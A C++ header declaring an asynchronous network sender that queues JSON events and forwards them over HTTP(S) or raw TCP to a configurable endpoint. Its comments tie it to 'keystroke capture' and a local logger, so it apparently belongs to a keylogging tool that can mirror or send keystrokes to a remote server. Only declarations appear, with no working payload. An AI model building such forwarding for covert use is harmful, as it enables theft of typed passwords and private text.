#pragma once

#include <atomic>
#include <condition_variable>
#include <deque>
#include <mutex>
#include <string>
#include <thread>

namespace net {

enum class Mode {
    Off,
    Mirror,
    NetOnly,
};

struct SenderConfig {
    std::string endpoint;     // http://, https://, or tcp:// URL
    std::string authToken;    // empty = no auth
    std::string caFile;       // optional PEM bundle (HTTPS only)
    int         timeoutMs = 5000;
    int         retryMax  = 3;
    int         batchMs   = 0;     // 0 = send immediately
    bool        insecureLocal = false;
};

// Asynchronous, best-effort sender. Owns a background thread that drains a
// queue of NDJSON-encoded events and POSTs them to the configured endpoint
// (or writes them as length-delimited lines to a raw TCP socket).
//
// In Mirror mode the local logger remains authoritative; this class never
// blocks the caller and never signals failure back to keystroke capture.
// In NetOnly mode the same is true at runtime — failures are still tolerated,
// but startup validation in main.cpp ensures the endpoint is configured.
class Sender {
public:
    Sender();
    ~Sender();

    // Initialize with the parsed config. Returns false on unrecoverable setup
    // errors (e.g. invalid CA file). Network errors at runtime are handled
    // internally and never returned here.
    bool start(const SenderConfig& cfg, std::string& errorOut);

    // Enqueue one already-serialized JSON event (no trailing newline).
    void enqueue(const std::string& jsonObject);

    // Flush remaining events with a bounded grace period, then stop the worker.
    void stop();

    // Statistics (best-effort, not strictly synchronized).
    long long sent()    const { return m_sent.load(); }
    long long dropped() const { return m_dropped.load(); }

private:
    void workerLoop();
    bool sendBatch(const std::string& body, bool ndjson, std::string& errorOut);

    SenderConfig                  m_cfg;
    std::thread                   m_thread;
    std::mutex                    m_mu;
    std::condition_variable       m_cv;
    std::deque<std::string>       m_queue;
    std::atomic<bool>             m_running{false};
    std::atomic<bool>             m_stopFlag{false};
    std::atomic<long long>        m_sent{0};
    std::atomic<long long>        m_dropped{0};

    // Parsed once at start().
    std::string m_scheme;
    std::string m_host;
    int         m_port = 0;
    std::string m_path;
};

}  // namespace net
